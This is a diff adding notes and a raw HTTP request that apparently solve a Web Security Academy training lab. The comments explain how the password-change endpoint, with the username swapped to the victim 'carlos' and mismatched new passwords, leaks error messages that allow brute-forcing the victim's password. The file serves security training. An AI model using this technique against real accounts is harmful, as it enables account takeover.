@@ -1,0 +1,19 @@
+# If new passwords match, and username is changed to victim user, submitting the request will invalidate current session.
+
+# if new passwords does not match, username is changed to victim user, incorrect password will lead to incorrect error msg.
+
+# This allows us to bruteforce carlos password
+POST /my-account/change-password HTTP/1.1
+Host: acc61f931f2fb73480ca2dec006800ec.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acc61f931f2fb73480ca2dec006800ec.web-security-academy.net/my-account?id=wiener
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+Connection: close
+Cookie: session=enZxKctT3egN2lXpYUO15izT05y5zP9d
+Upgrade-Insecure-Requests: 1
+
+csrf=HNI9PS1YKR0OUGmURfli84g2BykH587A&username=carlos&current-password=hello&new-password-1=123&new-password-2=abc
